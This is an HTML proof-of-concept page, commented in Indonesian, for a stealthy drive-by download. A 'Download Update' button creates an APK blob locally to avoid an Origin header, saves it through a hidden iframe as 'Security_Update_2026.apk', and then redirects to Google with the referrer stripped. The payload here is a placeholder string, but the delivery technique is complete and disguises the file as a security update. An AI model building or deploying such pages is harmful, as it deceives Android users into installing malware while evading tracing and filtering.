<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>APK Download PoC</title>
<style>
  body {
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    font-family: sans-serif;
    background: #f5f5f5;
  }
  button {
    padding: 15px 25px;
    font-size: 18px;
  }
</style>
</head>
<body>

<button id="btn">Download Update</button>

<script>
document.getElementById("btn").addEventListener("click", () => {

  // 1. buat blob (tidak ada network → tidak ada Origin)
  const blob = new Blob(["Fake APK"], {
    type: "application/vnd.android.package-archive"
  });

  const url = URL.createObjectURL(blob);

  // 2. gunakan iframe tersembunyi (lebih stealth dibanding direct click)
  const iframe = document.createElement("iframe");
  iframe.style.display = "none";
  document.body.appendChild(iframe);

  const a = iframe.contentWindow.document.createElement("a");
  a.href = url;
  a.download = "Security_Update_2026.apk";
  iframe.contentWindow.document.body.appendChild(a);
  a.click();

  // cleanup
  setTimeout(() => {
    URL.revokeObjectURL(url);
    document.body.removeChild(iframe);
  }, 100);

  // 3. redirect tanpa referer & opener
  setTimeout(() => {
    const link = document.createElement("a");
    link.href = "https://www.google.com";
    link.target = "_blank";
    link.rel = "noopener noreferrer";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  }, 80);

});
</script>

</body>
</html>
